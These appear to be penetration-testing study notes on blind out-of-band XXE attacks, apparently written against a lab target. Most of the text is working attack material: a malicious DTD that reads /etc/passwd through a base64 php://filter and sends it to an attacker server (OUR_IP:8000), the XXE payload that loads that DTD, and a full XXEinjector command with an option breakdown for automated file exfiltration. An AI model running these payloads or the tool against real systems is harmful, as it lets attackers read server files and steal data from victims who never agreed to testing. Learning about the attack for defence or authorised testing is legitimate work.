# Blind XXE — Out-of-Band (OOB) Data Exfiltration

## Used When

- Application does NOT display XML output
    
- Application does NOT display errors
    

Normal XXE and Error-based XXE fail.

---

# Main Idea

Victim server sends file content to attacker server through HTTP request.

---

# Attack Flow

```txt
1. Host malicious DTD
2. Victim loads DTD
3. Victim reads local file
4. Victim sends file content to attacker
5. Attacker captures data
```

---

# Malicious DTD

## xxe.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

---

# Explanation

## Read + Encode File

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

- Reads `/etc/passwd`
    
- Base64 encodes content
    
- Stores in `%file;`
    

---

## Send Data to Attacker

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Victim sends request:

```txt
http://OUR_IP:8000/?content=BASE64_DATA
```

# XXE Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

---

# Working

## Load External DTD

```xml
<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
```

---

## Execute DTD

```xml
%remote;
```

Loads malicious entities.

---

## Read File

```xml
%file;
```

Reads and encodes local file.

---

## Send Request to Attacker

```xml
%oob;
```

Victim sends encoded data to attacker server.

---

## Trigger Entity

```xml
<root>&content;</root>
```

Executes request.

# Why Base64 Encoding?

Prevents XML breaking from special characters like:

```txt

```

# Automated OOB Exfiltration with XXEinjector

## What is XXEinjector

- Tool used to automate XXE attacks.
    
- Supports:
    
    - Basic XXE
        
    - CDATA XXE
        
    - Error-based XXE
        
    - Blind OOB XXE
        

---

# Step 1: Clone the Tool

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Move into directory:

```bash
cd XXEinjector
```

---

# Step 2: Capture HTTP Request

- Intercept request in Burp Suite.
    
- Copy the full request.
    
- Save it into a file.
    

Example:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0
Content-Type: text/plain;charset=UTF-8
Accept: */*
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

---

# Important Point

Instead of full XML payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

- `XXEINJECT` = placeholder.
    
- Tool inserts malicious XXE payload automatically there.
    

---

# Step 3: Run XXEinjector

```bash
ruby XXEinjector.rb \
--host=[YOUR_IP] \
--httpport=8000 \
--file=/tmp/xxe.req \
--path=/etc/passwd \
--oob=http \
--phpfilter
```

---

# Command Breakdown

|Option|Meaning|
|---|---|
|`--host`|Your IP address|
|`--httpport`|Port for receiving data|
|`--file`|Saved HTTP request|
|`--path`|File to read from target|
|`--oob=http`|Use Out-of-Band HTTP exfiltration|
|`--phpfilter`|Base64 encode file using PHP filter|

---

# What Happens Internally

## Tool Automatically:

1. Creates malicious DTD
    
2. Hosts it on your machine
    
3. Sends XXE payload to target
    
4. Target reads file
    
5. Target sends file contents back to your server
    
6. Tool decodes and stores output

---

# Why `--phpfilter` is Used

Uses:

```xml
php://filter/convert.base64-encode/resource=/etc/passwd
```

Purpose:

- Prevent XML parsing issues
    
- Safely exfiltrate special characters
    
- Works better for source code/files
    

---

# Full Attack Flow

```text
1. Capture request in Burp
2. Save request with XXEINJECT placeholder
3. Run XXEinjector
4. Tool hosts malicious DTD
5. Target fetches DTD
6. Target reads local file
7. Target sends file data to attacker
8. Tool stores decoded output
```
